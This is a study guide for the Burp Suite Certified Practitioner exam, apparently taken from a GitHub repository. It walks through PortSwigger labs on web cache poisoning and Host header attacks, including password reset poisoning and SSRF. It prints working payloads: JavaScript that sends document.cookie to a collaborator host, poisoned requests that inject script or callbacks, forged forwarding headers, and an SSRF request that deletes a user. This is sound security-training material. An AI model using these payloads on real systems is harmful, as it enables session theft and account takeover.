<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Web Cache Poison</h2><a id="user-content-web-cache-poison" class="anchor" aria-label="Permalink: Web Cache Poison" href="#web-cache-poison"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#unkeyed-header">Unkeyed header</a><br>
<a href="#unkeyed-utm_content">Unkeyed Utm_content</a><br>
<a href="#cloaking-utm_content">Cloaking utm_content</a><br>
<a href="#poison-ambiguous-request">Poison ambiguous request</a><br>
<a href="#cache-poison-multiple-headers">Cache Poison multiple headers</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Unkeyed header</h3><a id="user-content-unkeyed-header" class="anchor" aria-label="Permalink: Unkeyed header" href="#unkeyed-header"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target use <strong>tracking.js</strong> JavaScript,<br>
and is vulnerable to <strong><code>X-Forwarded-Host</code></strong> or <strong><code>X-Host</code></strong> header redirecting path,<br>
allowing the stealing of cookie by poisoning cache.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the web cache headers in response and the tracking.js script in the page source code.<br>
Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/tracking-code-review.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/tracking-code-review.png" alt="Tracking source code review" style="max-width: 100%;"></a></p>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net"><pre>X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/tracking.js.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/tracking.js.png" alt="tracking.js" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Hosting on the exploit server, injecting the <strong><code>X-Forwarded-Host</code></strong> header in request, and poison the cache until victim hits poison cache.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="/resources/js/tracking.js"><pre class="notranslate"><code>/resources/js/tracking.js
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/exploit-host-tracking-js.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/exploit-host-tracking-js.png" alt="exploit host tracking.js" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Body send session cookie to collaboration service.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="document.location='https://OASTIFY.COM/?cookies='+document.cookie;"><pre><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-c1">=</span><span class="pl-s">'https://OASTIFY.COM/?cookies='</span><span class="pl-c1">+</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">;</span></pre></div>
<blockquote>
<p dir="auto">Keep <strong>Poisoning</strong> the web cache of target by resending request with <code>X-Forwarded-Host</code> header.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/x-cache-hit.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/x-cache-hit.png" alt="x-cache-hit.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header" rel="nofollow">PortSwigger Lab: Web cache poisoning with an unkeyed header</a></p>
<blockquote>
<p dir="auto">Youtube video showing above lab payload on exploit server modified to steal victim cookie when victim hits a cached entry on back-end server. The payload is the above JavaScript.</p>
</blockquote>
<p dir="auto"><a href="https://youtu.be/eNmF8fq-ur8" rel="nofollow">YouTube: Web cache poisoning with unkeyed header - cookie stealer</a></p>
<p dir="auto"><a href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943" rel="nofollow">Param Miner Extension to identify web cache vulnerabilities</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Unkeyed utm_content</h3><a id="user-content-unkeyed-utm_content" class="anchor" aria-label="Permalink: Unkeyed utm_content" href="#unkeyed-utm_content"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. Param Miner's "Guess GET parameters" feature will <em><strong>identify</strong></em> the parameter as utm_content.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cache-query-reflected.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cache-query-reflected.png" alt="Cache query reflected" style="max-width: 100%;"></a></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET /?utm_content='/&gt;&lt;script&gt;document.location=&quot;https://OASTIFY.COM?c=&quot;+document.cookie&lt;/script&gt;"><pre class="notranslate"><code>GET /?utm_content='/&gt;&lt;script&gt;document.location="https://OASTIFY.COM?c="+document.cookie&lt;/script&gt;
</code></pre></div>
<blockquote>
<p dir="auto">Above payload is cached and the victim visiting target cookie send to Burp collaborator.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cache-collaborator.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cache-collaborator.png" alt="cache-collaborator.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param" rel="nofollow">PortSwigger Lab: Web cache poisoning via an unkeyed query parameter</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Cloaking utm_content</h3><a id="user-content-cloaking-utm_content" class="anchor" aria-label="Permalink: Cloaking utm_content" href="#cloaking-utm_content"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Param Miner extension doing a <code>Bulk scan &gt; Rails parameter cloaking scan</code> will <em><strong>identify</strong></em> the vulnerability automatically. Manually it can be identified by adding <code>;</code> to append another parameter to <code>utm_content</code>, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key.<br>
The <code>source code</code> for <code>/js/geolocate.js?callback=setCountryCookie</code> is called on every page and execute callback function.</p>
</blockquote>
<blockquote>
<p dir="auto">The <code>callback</code> parameter is keyed, and thus cannot poison cache for victim user, but by combine duplicate parameter with <code>utm_content</code> it then excluded and cache can be poisoned.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET /js/geolocate.js?callback=setCountryCookie&amp;utm_content=fuzzer;callback=EVILFunction"><pre class="notranslate"><code>GET /js/geolocate.js?callback=setCountryCookie&amp;utm_content=fuzzer;callback=EVILFunction
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/utm_content_cloaking.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/utm_content_cloaking.png" alt="utm_content cache cloaking" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Cache Cloaking Cookie Capturing payload below, keep poising cache until victim hits stored cache.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET /js/geolocate.js?callback=setCountryCookie&amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='%2bdocument.cookie%3b HTTP/2"><pre class="notranslate"><code>GET /js/geolocate.js?callback=setCountryCookie&amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='%2bdocument.cookie%3b HTTP/2
</code></pre></div>
<blockquote>
<p dir="auto">Below is <a href="https://www.urldecoder.org/" rel="nofollow">Url Decoded</a> payload.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET/js/geolocate.js?callback=setCountryCookie&amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='+document.cookie; HTTP/2"><pre class="notranslate"><code>GET/js/geolocate.js?callback=setCountryCookie&amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='+document.cookie; HTTP/2
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking" rel="nofollow">PortSwigger Lab: Parameter cloaking</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Poison ambiguous request</h3><a id="user-content-poison-ambiguous-request" class="anchor" aria-label="Permalink: Poison ambiguous request" href="#poison-ambiguous-request"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Adding a second <strong>Host</strong> header with an exploit server, this <em><strong>identify</strong></em> a ambiguous cache vulnerability and routing your request. Notice that the exploit server in second <strong>Host</strong> header is reflected in an absolute URL used to import a script from <code>/resources/js/tracking.js</code>.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="Host: TARGET.net
Host: exploit.net"><pre>Host: TARGET.net
Host: exploit.net</pre></div>
<blockquote>
<p dir="auto">On the exploit server set a file as same path target calls to <code>/resources/js/tracking.js</code>, this will contain the payload. Place the JavaScript payload code below to perform a cookie stealer.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="document.location='https://OASTIFY.COM/?CacheCookies='+document.cookie;"><pre class="notranslate"><code>document.location='https://OASTIFY.COM/?CacheCookies='+document.cookie;
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ambiguous-hosts.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ambiguous-hosts.png" alt="Ambiguous Hosts" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests" rel="nofollow">PortSwigger Lab: Web cache poisoning via ambiguous requests</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Cache Poison multiple headers</h3><a id="user-content-cache-poison-multiple-headers" class="anchor" aria-label="Permalink: Cache Poison multiple headers" href="#cache-poison-multiple-headers"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Identify that cache hit headers in responses,<br>
then test if the target support <code>X-Forwarded-Host</code> or <code>X-Forwarded-Scheme</code> headers.<br>
These headers can allow for the stealing of victim session cookie.</p>
</blockquote>
<blockquote>
<p dir="auto">Identify if adding the two <strong>Forwarded</strong> headers to the GET <code>/resources/js/tracking.js</code> request, result in a change to the location response header. This <em><strong>identify</strong></em> positive poisoning of the cache with multiple headers.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="GET /resources/js/tracking.js?cb=123 HTTP/2
Host: TARGET.net
X-Forwarded-Host: EXPLOIT.net
X-Forwarded-Scheme: nothttps"><pre>GET /resources/js/tracking.js?cb=123 HTTP/2
Host: TARGET.net
X-Forwarded-Host: EXPLOIT.net
X-Forwarded-Scheme: nothttps</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/x-forwarded-scheme-nohttps.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/x-forwarded-scheme-nohttps.png" alt="x-forwarded-scheme not https" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">On the exploit server change the file path to <code>/resources/js/tracking.js</code><br>
and then update the poison request <code>X-Forwarded-Host: EXPLOIT.net</code> header.<br>
Place the payload on exploit server body.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="document.location='https://OASTIFY.COM/?poisoncache='+document.cookie;"><pre>document.location='https://OASTIFY.COM/?poisoncache='+document.cookie;</pre></div>
<blockquote>
<p dir="auto">Remove the <code>cb=123</code> cache <strong>buster</strong>, and then poison the cache until the victim is redirected to the exploit server payload tracking.js to steal session cookie.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers" rel="nofollow">PortSwigger Lab: Web cache poisoning with multiple headers</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Duplicate Parameter Fat Poison</h3><a id="user-content-duplicate-parameter-fat-poison" class="anchor" aria-label="Permalink: Duplicate Parameter Fat Poison" href="#duplicate-parameter-fat-poison"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Identify that the application is vulnerable to duplicate parameter poisoning, by adding a second parameter with same name and different value the response reflected the injected value.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/countrycode-source-code.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/countrycode-source-code.png" alt="countrycode source code" style="max-width: 100%;"></a></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET /js/geolocate.js?callback=setCountryCookie&amp;callback=FUZZERFunction; HTTP/2"><pre class="notranslate"><code>GET /js/geolocate.js?callback=setCountryCookie&amp;callback=FUZZERFunction; HTTP/2
</code></pre></div>
<blockquote>
<p dir="auto">The function that is called in the response by passing in a duplicate callback parameter is reflected. Notice in response the cache key is still derived from the original callback parameter in the GET request line.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/fat-get-request.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/fat-get-request.png" alt="fat-get-request" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Not able to make cookie stealer payload working......</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get" rel="nofollow">PortSwigger Lab: Web cache poisoning via a fat GET request</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Host Headers</h2><a id="user-content-host-headers" class="anchor" aria-label="Permalink: Host Headers" href="#host-headers"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#spoof-ip-address">Spoof IP Address</a><br>
<a href="#host-connection-state">HOST Connection State</a><br>
<a href="#host-routing-based-ssrf">Host Routing based SSRF</a><br>
<a href="#absolute-get-url--host-ssrf">SSRF via flawed Host request parsing</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Spoof IP Address</h3><a id="user-content-spoof-ip-address" class="anchor" aria-label="Permalink: Spoof IP Address" href="#spoof-ip-address"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> that altered HOST headers are supported,<br>
which allows you to spoof your IP address and bypass the IP-based brute-force protection<br>
or redirection attacks to do <em><strong>password reset</strong></em> poisoning.</p>
</blockquote>
<blockquote>
<p dir="auto">Include the below <code>X- </code> headers and change the username parameter on the password reset request to <code>Carlos</code> before sending the request.<br>
In the BSCP exam if you used this exploit then it means you have not used a vulnerability that require user interaction and allow you to use an interaction vulnerability to gain access to stage 3 as admin by using exploit server <code>Deliver exploit to victim</code> function.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net"><pre>X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net</pre></div>
<blockquote>
<p dir="auto">Tips &amp; Notes from <em><strong>fullfox</strong></em>:</p>
</blockquote>
<ul dir="auto">
<li>When spoofing host header on password reset using <code>Host:</code> or <code>X-Forwarded-Host:</code>, if you receive the error <code>Invalid hostname</code>, try using the following hostname: <code>xxx.oastify.com?TARGET.net</code> legit target URL without a slash.</li>
</ul>
<blockquote>
<p dir="auto">Check the exploit server log to obtain the reset link to the victim username.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/HOST-Header-forgot-password-reset.PNG"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/HOST-Header-forgot-password-reset.PNG" alt="Exploit Server Logs capture the forgot password reset token" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware" rel="nofollow">PortSwigger Lab: Password reset poisoning via middle-ware</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">HOST Connection State</h3><a id="user-content-host-connection-state" class="anchor" aria-label="Permalink: HOST Connection State" href="#host-connection-state"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target is vulnerable to <strong>routing-based SSRF</strong> via the Host header, but validate connection state of the first request. Sending grouped request in sequence using <strong>single connection</strong> and setting the connection header to <strong>keep-alive</strong>, bypass host header validation and enable SSRF exploit of local server.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="GET / HTTP/1.1
Host: TARGET.net
Cookie: session=ValueOfSessionCookie
Content-Length: 48
Content-Type: text/plain;charset=UTF-8
Connection: keep-alive"><pre>GET / HTTP/1.1
Host: TARGET.net
Cookie: session=ValueOfSessionCookie
Content-Length: 48
Content-Type: text/plain;charset=UTF-8
Connection: keep-alive</pre></div>
<blockquote>
<p dir="auto">Next request is the second tab in group sequence of requests.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST /admin/delete HTTP/1.1
Host: localhost
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=TheCSRFTokenValue&amp;username=carlos"><pre>POST /admin/delete HTTP/1.1
Host: localhost
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=TheCSRFTokenValue&amp;username=carlos</pre></div>
<blockquote>
<p dir="auto">Observe that the second request has successfully accessed the admin panel.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/single-connection.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/single-connection.png" alt="single connection" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack" rel="nofollow">PortSwigger Lab: Host validation bypass via connection state attack</a></p>
<hr>
